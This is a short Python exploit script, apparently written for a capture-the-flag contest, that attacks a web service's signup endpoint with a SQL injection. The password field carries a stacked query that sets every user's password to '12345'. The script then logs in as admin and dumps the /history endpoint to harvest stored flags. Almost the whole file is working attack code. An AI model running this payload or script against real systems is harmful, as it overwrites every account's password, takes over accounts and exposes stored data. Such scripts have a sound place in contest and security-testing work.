#!/usr/bin/env python3
import argparse, requests

#START ME LIKE ./1.py 127.0.0.1 8181

def sqli(ip, port):
    try:
        r1 = requests.post(f"http://{ip}:{port}/signup",json={"username":"imuniqueuserlol","password":"123', '1');UPDATE `users` SET `password`='12345';--"})
        #THEN get all users u want via /history without cookies
        #and connect using freshly setted password
        #in poc i would use admin, because it is in here by the way of creating db
        s = requests.Session()
        r2 = s.post(f"http://{ip}:{port}/signin",json={"username":"admin","password":"12345"})
        r3 = s.get(f"http://{ip}:{port}/history")
        #and if there any flags in db, there will be dumped
        print(r3.json())
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit the fifth vulnerability sqli")
    parser.add_argument("ip", help="vulnerable host ip passed here")
    parser.add_argument("port", help="port to web")
    args = parser.parse_args()
    sqli(args.ip, int(args.port))
